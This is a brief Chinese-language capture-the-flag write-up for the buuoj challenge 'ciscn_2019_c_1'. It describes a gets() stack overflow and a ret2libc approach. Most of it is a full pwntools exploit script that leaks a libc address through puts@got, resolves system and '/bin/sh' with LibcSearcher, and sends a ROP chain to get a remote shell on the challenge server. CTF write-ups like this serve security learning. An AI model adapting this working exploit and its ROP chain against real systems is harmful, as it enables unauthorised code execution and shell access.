# ciscn 2019 c 1 

From buuoj.

## 文件分析

下载`ciscn_2019_c_1`, NX on, PIE off, RELRO partial  
ghidra分析为64位程序

## 逆向

函数`encrypt()`中存在`gets`，考虑**栈溢出**攻击  
.text段中不存在后门函数，并且有nx，考虑ret2libc

**记录首次学会**

1. 获取`pop rdi; ret;`和puts@plt地址
2. 栈溢出打印puts@got
3. 根据puts@got获知靶机使用的libc
4. 将**puts@got**偏移到system@got & shstr@got
5. 回到`gets`函数，重新执行溢出拿到sh

## 重大注意

如果一个字节为**0x0a**，**会被截断**！（换行）

## EXPLOIT

```python
from pwn import *
import LibcSearcher
sh = remote('node4.buuoj.cn', 29693)
elf = ELF('ciscn_2019_c_1')

putsPlt = elf.plt['puts']
putsGot = elf.got['puts']
popRdiAddr = 0x0400c83
vulnAddr = 0x004009a0
retAddr = 0x0040099f # 不能带0x0a!!!

sh.sendline(b'1') # 选择1.Encrypt (Vulnerable Function)
sh.sendline(b'0'*0x58 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(vulnAddr))

sh.recvuntil(b'\nI') # skip
sh.recvuntil(b'\nI') # skip
data = sh.recvuntil(b'\nI') 
putsGotAddr = u64(data[-8:-2] + b'\0\0')

libc = LibcSearcher.LibcSearcher('puts', putsGotAddr & 0xfff)
libcbase = putsGotAddr - libc.dump('puts')
systemAddr = libcbase + libc.dump('system')
shstrAddr = libcbase + libc.dump('str_bin_sh')

sh.sendline(b'0'*0x58 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

sh.interactive()
```

Done.
